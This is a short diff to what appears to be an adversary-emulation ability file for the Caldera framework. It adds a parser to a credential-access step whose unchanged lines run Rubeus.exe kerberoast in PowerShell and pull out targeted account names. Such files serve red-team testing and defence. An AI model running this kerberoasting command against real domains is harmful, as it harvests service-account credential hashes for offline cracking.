@@ -7,6 +7,9 @@
         command: $m=.\Rubeus.exe kerberoast /nowrap | Select-String -Pattern "SamAccountName\s+:\s(?<target>\S+)"
           -List;          $m.Matches.groups | ? { $_.Name -eq 'target' } | Select-Object
           -ExpandProperty Value;
+        parsers:
+          plugins.stockpile.app.parsers.basic:
+            - source: host.user.name
         payloads:
           - Rubeus.exe
   tactic: credential-access
